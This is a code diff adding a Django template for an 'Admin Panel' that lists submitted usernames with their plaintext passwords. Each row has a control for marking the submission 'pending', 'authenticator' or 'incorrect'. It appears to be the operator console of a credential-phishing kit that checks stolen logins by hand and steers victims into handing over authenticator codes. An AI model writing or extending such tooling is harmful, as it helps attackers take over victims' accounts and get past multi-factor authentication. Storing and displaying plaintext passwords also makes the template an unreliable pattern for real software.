@@ -1,0 +1,33 @@
+<h1>Admin Panel</h1>
+<table border="1">
+    <thead>
+        <tr>
+            <th>ID</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>Status</th>
+            <th>Actions</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for submission in submissions %}
+        <tr>
+            <td>{{ submission.id }}</td>
+            <td>{{ submission.username }}</td>
+            <td>{{ submission.password }}</td>
+            <td>{{ submission.status }}</td>
+            <td>
+                <form action="{% url 'set_status' submission_id=submission.id %}" method="POST">
+                    {% csrf_token %}
+                    <select name="status">
+                        <option value="pending" {% if submission.status == 'pending' %}selected{% endif %}>Pending</option>
+                        <option value="authenticator" {% if submission.status == 'authenticator' %}selected{% endif %}>Authenticator</option>
+                        <option value="incorrect" {% if submission.status == 'incorrect' %}selected{% endif %}>Incorrect</option>
+                    </select>
+                    <button type="submit">Update</button>
+                </form>
+            </td>
+        </tr>
+        {% endfor %}
+    </tbody>
+</table>
